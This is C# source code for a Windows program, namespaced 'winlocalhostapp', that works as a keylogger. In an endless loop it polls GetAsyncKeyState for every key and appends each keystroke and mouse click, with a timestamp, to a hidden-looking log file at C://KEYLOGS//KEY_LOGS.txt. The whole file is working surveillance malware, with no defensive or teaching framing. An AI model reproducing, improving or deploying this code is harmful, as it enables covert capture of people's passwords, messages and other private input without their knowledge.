using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;



namespace winlocalhostapp
{

    class Program
    {
        //dllimport is used here because it is necessary to use the unmanaged code in the user32.dll --Lakhsay
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        static void Main(string[] args)
        {
            getkeys();
        }

        static void getkeys()
        {
            String path = "C://KEYLOGS//KEY_LOGS.txt";

            //check if the file exists at the given path or not.

            if (!File.Exists(path))
            {
                //make a method that creates the file at the given path.

                using (StreamWriter sw = File.CreateText(path))
                {
                    //can leave empty
                }

            }
                KeysConverter converter = new KeysConverter();
                String text = "";

                //loop
                while (true)
                {
                    Thread.Sleep(10);

                foreach (Int32 i in Enum.GetValues(typeof(Keys)))
                {
                        int key = GetAsyncKeyState(i);

                        if (key == -32767)
                        {
                            text = converter.ConvertToString(Enum.GetName(typeof(Keys),i));
                            
                            using (StreamWriter sw = File.AppendText(path))
                            {
                            
                                String record = Convert.ToString(System.DateTime.Now);
                                if(text== "OemQuestion")
                                {
                                     text = "?";
                                }
                                else if(text== "OemPeriod")
                                {
                                    text = ".";
                                }
                                else if(text== "LButton")
                                {
                                    text = "Mouse-Left";
                                }
                                else if (text == "RButton")
                                {
                                    text = "Mouse-Right";
                                }
                                else if (text == "LControl")
                                {
                                    text ="Control-Left";
                                }
                                else if (text == "RControl")
                                {
                                       text = "Control-Right";
                                }
                                sw.WriteLine("Date: " + record + " and key :" + text);

                        }
                        break;
                    }
                        
                    }
                }
            
        }
    }
}

